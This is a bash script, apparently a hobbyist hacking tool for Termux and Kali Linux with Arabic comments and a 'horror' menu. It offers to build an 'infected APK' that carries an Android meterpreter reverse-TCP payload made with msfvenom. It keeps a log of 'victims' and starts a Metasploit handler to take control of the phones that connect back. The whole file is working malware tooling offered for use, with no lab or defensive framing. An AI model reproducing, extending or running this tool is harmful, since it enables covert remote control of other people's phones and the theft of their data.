cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: XXSZMSX (FULLSCREEN HORROR EDITION)
# COMPATIBILITY: TERMUX & KALI LINUX
# =====================================================

# تعريف ألوان الرعب
RED='\e[1;31m'
BRED='\e[1;31;1m'
NC='\e[0m'

LOG_FILE=".victims_log.txt"
DB_FILE=".studio_config"

# تحديد نظام التشغيل ومكان الحفظ
if [[ -d "/data/data/com.termux/files/usr/bin" ]]; then
    OS="TERMUX"
    SAVE_DIR="/sdcard"
else
    OS="KALI-LINUX"
    SAVE_DIR="$HOME/Desktop"
fi

# --- [ واجهة تسجيل الدخول ] ---
clear
echo -e "${BRED}"
echo "-----------------------------------------------------"
echo "        XXSZMSX SYSTEM | SECURE TERMINAL             "
echo "-----------------------------------------------------${NC}"
echo -e "${RED}[+] Identity: ${NC}"
read username
echo -e "${RED}[+] Key: ${NC}"
read -s password

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${BRED}[!] ALERT: ACCESS DENIED!${NC}"
    exit 1
fi

# --- [ القائمة الرئيسية ] ---
while true; do
    clear
    echo -e "${BRED}"
    # رسمة اسم الأداة بشكل يناسب عرض الشاشة
    echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗"
    echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║"
    echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║"
    echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║"
    echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝"
    echo "          [ X X S Z M S X ] - [ $OS ]         "
    echo "-----------------------------------------------------"
    echo -e "  [1] BUILD INFECTED APK (CUSTOM) "
    echo -e "  [2] VIEW VICTIMS DATABASE       "
    echo -e "  [3] EXECUTE CONTROL SERVER      "
    echo -e "  [0] SYSTEM SHUTDOWN             "
    echo "-----------------------------------------------------"
    echo -ne "  XXSZMSX >> ${NC}"
    read choice

    case $choice in
        1) 
           clear
           echo -e "${BRED}[*] APK GENERATOR MODE${NC}"
           echo "-----------------------------------"
           read -p "[+] App Name: " app_name
           read -p "[+] Icon URL: " icon_url
           read -p "[+] LHOST IP: " lh
           read -p "[+] LPORT: " lp
           echo "$lh:$lp" > "$DB_FILE"
           echo "[$(date +%H:%M)] App: $app_name | IP: $lh" >> "$LOG_FILE"
           echo -e "${RED}[*] Injecting...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_DIR/$app_name.apk"
           echo -e "${BRED}[+] Success! Check $SAVE_DIR${NC}"
           read -p "Press Enter..." ;;
        2)
           clear
           echo -e "${BRED}[*] VICTIMS LOGS${NC}"
           echo "-----------------------------------"
           [ -f "$LOG_FILE" ] && cat "$LOG_FILE" || echo "Database Empty"
           echo "-----------------------------------"
           read -p "Press Enter..." ;;
        3) 
           clear
           if [ -f "$DB_FILE" ]; then
               IP=$(cut -d: -f1 "$DB_FILE"); PORT=$(cut -d: -f2 "$DB_FILE")
               echo -e "${RED}[*] Starting Server on $IP:$PORT...${NC}"
               msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j"
           else
               echo -e "${BRED}[!] Error: No Config found.${NC}"
               sleep 2
           fi ;;
        0) exit 0 ;;
    esac
done
EOF
